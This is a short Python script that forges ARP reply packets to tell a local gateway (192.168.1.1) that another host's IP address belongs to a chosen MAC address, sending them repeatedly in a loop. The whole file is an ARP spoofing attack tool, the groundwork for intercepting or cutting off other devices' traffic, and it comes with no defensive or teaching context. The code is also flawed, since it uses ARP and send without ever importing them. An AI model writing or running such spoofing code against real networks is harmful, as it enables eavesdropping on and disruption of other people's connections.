#coding=utf-8
import sys
import getopt
import socket
import struct
import fcntl

gate=['192.168.1.1']
ipAdd=['192.168.1.3']
MAC="00E04C317D8C"
gateMac="940C6D50A852"
def arpsend(target,mac,host,hmac):
    a=ARP()
    a.op=2
    a.pdst=target
    a.hwdst=mac
    a.psrc=host
    a.hwsrc=hmac
    send(a,loop=1,count=50)
arpsend(gate[0],gateMac,ipAdd[0],MAC)
